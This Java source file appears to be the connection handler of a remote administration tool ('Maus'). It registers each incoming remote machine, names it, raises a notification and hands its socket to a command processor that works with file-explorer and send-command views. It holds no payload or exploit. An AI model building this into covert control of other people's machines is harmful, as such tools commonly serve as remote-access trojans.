package Server;

import GUI.Controller;
import GUI.ResizeHelper;
import GUI.Views.FileExplorerView;
import GUI.Views.NotificationView;
import GUI.Views.SendCommandView;
import Logger.Level;
import Logger.Logger;
import Server.Data.PseudoBase;
import Server.Data.Repository;
import javafx.animation.PauseTransition;
import javafx.application.Platform;
import javafx.geometry.Rectangle2D;
import javafx.scene.Scene;
import javafx.stage.Screen;
import javafx.stage.Stage;
import javafx.stage.StageStyle;
import javafx.util.Duration;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;

public class ClientHandler implements Runnable, Repository {
    private Socket socket;
    private ClientObject client;

    ClientHandler(Socket socket) {
        this.socket = socket;
    }

    @Override
    public void run() {
        try {
            String ip = (((InetSocketAddress) Server.getClient().getRemoteSocketAddress()).getAddress()).toString().replace("/", "");
            /* Check to ensure there's room left via Max Connections setting. */
            if (CONNECTIONS.size() < ServerSettings.getMaxConnections()) {
                if (!CONNECTIONS.containsKey(ip)) {
                    client = new ClientObject(socket, "Maus Machine " + (PseudoBase.getMausData().size() + 1), ip);
                } else {
                    client = new ClientObject(socket, CONNECTIONS.get(ip).getNickName(), ip);
                }
                Platform.runLater(() -> PseudoBase.getMausData().put(ip, client));
            }
            Controller.updateStats();
            /* Notification on new client connection */
            Platform.runLater(() -> NotificationView.openNotification(client));
            InputStream is = client.getClient().getInputStream();
            ProcessCommands.processCommands(is, client);
        } catch (IOException e) {
            client.setOnlineStatus("Offline");
        }
    }
}